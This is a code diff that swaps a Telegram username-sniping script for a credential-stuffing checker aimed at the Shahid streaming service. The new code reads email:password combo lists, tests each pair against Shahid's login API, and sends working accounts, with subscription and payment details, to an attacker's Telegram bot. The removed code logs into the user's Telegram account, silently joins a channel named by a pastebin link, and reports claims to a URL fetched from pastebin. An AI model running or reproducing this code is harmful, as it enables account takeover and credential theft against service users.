@@ -1,171 +1,163 @@
-from os import system, name, path
-import requests
-import random
-from time import sleep
-from random import choice
-from base64 import b64decode
+import os
 try:
-    from requests import get
-except:
-    system('pip install requests')
-    from requests import get
-try:
-    from telethon import TelegramClient, sync, errors, functions, types
-    from telethon.tl.functions.account import CheckUsernameRequest, UpdateUsernameRequest
-    from telethon.tl.functions.channels import JoinChannelRequest
-except:
-    system('pip install telethon')
-    from telethon import TelegramClient, sync, errors, types, functions
-    from telethon.tl.functions.account import CheckUsernameRequest, UpdateUsernameRequest
-    from telethon.tl.functions.channels import JoinChannelRequest
-try:
-    from bs4 import BeautifulSoup as S
-except:
-    system('pip install beautifulsoup')
-    from bs4 import BeautifulSoup as S
-try:
-    from fake_useragent import UserAgent
-except:
-    system('pip install fake_useragent')
-    from fake_useragent import UserAgent
-try:
-  from datetime import datetime
-except:
-  system('pip install datetime')
-  from datetime import datetime
-# Import/Download Libraries
-me = get('https://pastebin.com/raw/dATfCHba').text
-def clear():
-  system('cls' if name=='nt' else 'clear')
-# for check flood , error
-def channels2(client, username):
-    di = client.get_dialogs()
-    for chat in di:
-        if chat.name == f'Clime aBooD [ {username} ]' and not chat.entity.username:
-            client(functions.channels.DeleteChannelRequest(channel=chat.entity))
-            return False
-    return True
+    from cfonts import render, say
+except ModuleNotFoundError:
+    os.system('pip install python-cfonts')
 
-def fragment(username):
-    headers = {
-        'User-Agent': UserAgent().random,
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
-        'TE': 'trailers'}
-    response = get(f'https://fragment.com/username/{username}', headers=headers)
-    soup = S(response.content, 'html.parser')
-    ok = soup.find("meta", property="og:description").get("content")
-    if "An auction to get the Telegram" in ok or "Telegram and secure your ownership" in ok or "Check the current availability of" in ok or "Secure your name with blockchain in an ecosystem of 700+ million users" in ok:return True
-    elif "is taken" in ok:return "is taken"
-    else:return False
-# for claim username
-def telegram(client,claim,username):
-  if claim:
-    text = f"𝖭𝖾𝗐 𝗎𝖲𝖾𝗋 , 𝖺𝖡𝗈𝗈𝖣\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 〕: 〔 @{username} 〕\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 𝖯𝖾𝗋𝖲𝗈𝗇 〕 : @{client.get_me().username} .\nএ〔 𝖢𝗅𝖺𝗂𝗆? 〕 {claim} .\nএ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕 : {me} ."
-    try:get(get('https://pastebin.com/raw/r9sL3w0j').text+text)
-    except:pass
-  else:
-    text = f"𝖭𝖾𝗐 𝗎𝖲𝖾𝗋 , 𝖺𝖡𝗈𝗈𝖣\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 〕 : @{username} .\nএ〔 𝖢𝗅𝖺𝗂𝗆? 〕 {claim} .\nএ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕 : {me} ."
-  client.send_message('me',text)
-def climed(client,username):
-    id = (
-      '7f784e64a41b31365e45f.mp4',
-      '986edfe7d6cf9ccb2cb8a.mp4',
-      '5fcbf5fad369ccc38976b.mp4',
-      '9e18e26f2ba65a5f826be.mp4',
-      '46301e4efcb3a2e281f79.mp4')
-    id = choice(id)
-    result = client(functions.channels.CreateChannelRequest(
-    title=f'এ〔 𝖢𝗅𝖺𝗂𝗆 〕|〔 {username} 〕',
-        about=f'এ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕| {me}',
-        megagroup=False))
-    try:
-        client(functions.channels.UpdateUsernameRequest(
-        channel=result.chats[0],
-        username=username))
-        client(functions.channels.EditPhotoRequest(
-        channel=username,
-        photo=client.upload_file(get("https://telegra.ph/file/23423b32334d1d4a70aad.jpg").content)))
-        client.delete_messages(username, [client.get_messages(username, limit=1)[0]])
-        with open('videoclaim.mp4','wb') as video :
-          video.write(get('https://telegra.ph/file/'+id).content)
-          sleep(0.50)
-        client.send_file(username, file='videoclaim.mp4', caption=f'𝖭𝖾𝗐 𝗎𝖲𝖾𝗋 , 𝖺𝖡𝗈𝗈𝖣\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 〕 : @{username} .\nএ〔 𝖢𝗅𝖺𝗂𝗆 〕 : @{client.get_me().username}\nএ〔 𝖣𝖺𝗍𝖺 〕 : {datetime.now().strftime("%H:%M:%S")} .\nএ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕 : {me} .')
-        return True
-    except Exception as e:client.send_message('me',f'⌯ Error Message .\nMessage : {e} .');return False
-# for checking username
-def checker(username,client):
-		try:
-			check = client(CheckUsernameRequest(username=username))
-			if check:
-				print('- Available UserName : '+username+' .')
-				claimer = climed(client,username)
-				if claimer and fragment(username) == "is taken":claim = True
-				else:claim = False
-				print('- Claimer ? '+str(claim)+'\n'+'_ '*20)
-				telegram(client,claim,username)
-				flood = channels2(client,username)
-				if not flood:
-					with open('flood.txt', 'a') as floodX:
-						floodX.write(username + "\n")
-			else:
-				print('- Taken UserName : '+username+' .')
-		except errors.rpcbaseerrors.BadRequestError:
-			print('- Banned UserName : '+username+' .')
-			open("banned4.txt","a").write(username+'\n')
-		except errors.FloodWaitError as timer:
-			print('- Flood Account [ '+timer.seconds+' Secound ] .')
-		except errors.UsernameInvalidError:
-			print('- Error UserName : '+username+' .')
-# for generate username
-def usernameG():
-	k = ''.join(choice('qwertyuiopasdfghjklzxcvbnm') for i in range(1))
-	n = ''.join(choice('1234567890') for i in range(1))
-	return k+n+'_'+k+k
-# start checking
-def start(client,username):
-	try:ok = fragment(username)
-	except:return
-	try:
-		if not ok:
-			checker(username,client)
-		elif ok == "is taken":
-			print('- Taken UserName : '+username+' .')
-		else:
-			print('- UserName Availabe In Fragment.com : '+username+' .')
-	except Exception as e:print(e)
-# get client
-def clientX():
-	phone = '' # Your Phone Number
-	if phone == '':phone = input('- Enter Phone Number Telegram : ')
-	client = TelegramClient("aho", b64decode("MjUzMjQ1ODE=").decode(),b64decode("MDhmZWVlNWVlYjZmYzBmMzFkNWYyZDIzYmIyYzMxZDA=").decode())
-	try:client.start(phone=phone)
-	except:exit()
-	try:client(JoinChannelRequest(get('https://pastebin.com/raw/SgDUMsFb').text))
-	except:pass
-	clear()
-	return client
-# start tool
-def work():
-	session = clientX()
-	if not path.exists('banned4.txt'):
-		with open('banned4.txt','w') as new:pass
-	if not path.exists('flood.txt'):
-		with open('flood.txt','w') as new:pass
-	while True:
-		username = usernameG()
-		with open('banned4.txt', 'r') as file:
-			check_username = file.read()
-		if username in check_username :
-			print('- Banned1 UserName : '+username+' .')
-			continue
-		start(session,username)
-if __name__ == "__main__":
-	work()
+output = render('S-VIP', colors=['green', 'yellow'], align='center')
+print(output)
+print('#' *60)
+import requests
+from time import mktime, strptime
+from uuid import uuid4
+from datetime import datetime
+from telebot import TeleBot  
+
+Hit = 0
+Erorr = 0
+Custom = 0
+Cp = 0
+def cls():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+Z = '\033[1;31m'
+B = '\x1b[38;5;208m'  # ذهبي
+U = '\x1b[1;37m'  # ابیض
+F = '\033[2;32m'  # اخضر
+A = '\033[2;34m'  # ازرق
+X = '\033[2;35m'  # وردي
+
+def timer():
+    key = str(uuid4()).upper()
+    date = '2023-09-05:12-30-00'
+    ms = mktime(strptime(date, "%Y-%m-%d:%H-%M-%S")) * 1000
+    return key, ms
+
+def mahos():
+    global Hit, Erorr, Custom, Cp
+    ID = input(f"{B}ENTER YOUR ID Telegram : ")
+    token = input(f"{Z}ENTER YOUR TOKEN Bot : ")
+
+    check = requests.get(url=f"https://api.telegram.org/bot{token}/getMe").json().get('ok', False)
+
+    if not check:
+        print('خطا في التوكن ادخله مره اخرى.')
+        return mahos()
+
+    bot = TeleBot(token)
+
+    file = input(f'{A}[+] ENTER Name Combo E : ')
+
+    while True:
+        with open(file, "r") as f:
+            for i in f.read().splitlines():
+                password = i.split(":")[1]
+                email = i.split(":")[0]
+
+                headers = {
+                    "Host": "api2.shahid.net",
+                    "UUID": "web",
+                    "Accept": "application/json",
+                    "Accept-Language": "en",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Content-Type": "application/json",
+                    "Origin": "https://shahid.mbc.net",
+                    "language": "EN",
+                    "User-Agent": "Shahid/7.44.0.3940 CFNetwork/1402.0.8 Darwin/22.2.0 (iPhone/13 iOS/16.2) Safari/604.1",
+                    "Referer": "https://shahid.mbc.net/",
+                    "Connection": "keep-alive"
+                }
+
+                data = {
+                    "t": timer()[1],
+                    "country": "IQ",
+                    "email": email,
+                    "rawPassword": password,
+                    "subscribeToNewsLetter": False,
+                    "terms": True,
+                    "deviceSerial": timer()[0],
+                    "deviceType": "Mobile",
+                    "physicalDeviceType": "IOS",
+                    "label": "iPhone",
+                    "isNewUser": False,
+                    "captchaToken": "HG45YgHr%^&Qad$56GhrF4G466Dhy@%^J6&jD789qAft^@yT%^*JhjyfwDD",
+                    "isEmailVerified": False,
+                    "isEmailVerifiedZerobounce": False,
+                    "prefix": "",
+                    "withCountryPrefix": False,
+                }
+
+                r = requests.post('https://api2.shahid.net/proxy/v2.1/usersservice/validateLogin', headers=headers, json=data)
+
+                if r.status_code != 200:
+                    if 'Cannot find the user' in r.text:
+                        cls()
+                        Erorr += 1 
+                        print(f'''
+ {F} [1] {F} {F}Available - Available! : {Custom}
+ {Z} [2] {Z} {Z}BAD GM - Bad Email : {Erorr}」
+ {F} [3] {F} {F} HitS : {Hit}
+ {X} [4] {X} {X} Check point : {Cp}
+ {X} [5] {X} {X} Email : {email}
+ {U} [6] {U} {U}Password : {password}''')
+                    elif 'You have reached the maximum number of linked devices' in r.text:
+                        cls()
+                        Custom += 1 
+                        print(f'''
+ {F} [1] {F} {F}Available - Available! : {Custom}
+ {Z} [2] {Z} {Z}BAD GM - Bad Email : {Erorr}」
+ {F} [3] {F} {F} HitS : {Hit}
+ {X} [4] {X} {X} Check point : {Cp}
+ {X} [5] {X} {X} Email : {email}
+ {U} [6] {U} {U}Password : {password}''')
+                        msg  = f'''
+                       -------------------------
+                       Free Account : >
+                       Email : {email}
+                       Password : {password}
+                       ------------------------'''
+                        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}')
+                elif "success" in r.text:
+                    cls()
+                    Hit += 1
+                    print(f''' 
+ {F} [1] {F} {F}Available - Available! : {Custom}
+ {Z} [2] {Z} {Z}BAD GM - Bad Email : {Erorr}」
+ {F} [3] {F} {F} HitS : {Hit}
+ {X} [4] {X} {X} Check point : {Cp}
+ {X} [5] {X} {X} Email : {email}
+ {U} [6] {U} {U}Password : {password}''')
+                    try:
+                        name1 = r.json()['user']['firstName']
+                        name2 = r.json()['user']['lastName']
+                        user_id = r.json()['user']['id']
+                        sub = r.json()['user']['subscriber']
+
+                        if sub:
+                            start = r.text.split('"startDate":')[1].split(',')[0]
+                            end = r.text.split('"endDate":')[1].split(',')[0]
+                            time_start = int(start) / 1000
+                            time_end = int(end) / 1000
+                            start = datetime.fromtimestamp(time_start).strftime("%Y-%m-%d %H:%M:%S")
+                            end = datetime.fromtimestamp(time_end).strftime("%Y-%m-%d %H:%M:%S")
+                            method = r.text.split('"paymentMethodType":"')[1].split('"')[0]
+                            tlg = f"""Hi New Shahid Account \n- Email : {email}\n- Password : {password}\n- Name : {name1} {name2}\n- Subscriber : {sub}\n- Method Pay : {method}\n- Time Start : {start}\n- Time End : {end} \n BY : @maho_s9 ."""
+                            requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
+                        else:
+                            cls()
+                            Cp += 1
+                            print(f'''
+ {F} [1] {F} {F}Available - Available! : {Custom}
+ {Z} [2] {Z} {Z}BAD GM - Bad Email : {Erorr}」
+ {F} [3] {F} {F} HitS : {Hit}
+ {X} [4] {X} {X} Check point : {Cp}
+ {X} [5] {X} {X} Email : {email}
+ {U} [6] {U} {U}Password : {password}''')
+
+                    except KeyError:
+                        sosh = r.json()['faults']['userMessage']
+                        if sosh == "Sorry! The email address has already been used for social media registration. Please log in through your social media account or provide a different email address.":
+                            print(f'Social Media : [ Email : {email} / Password : {email} ]')
+                            return 'media'
+
+mahos()
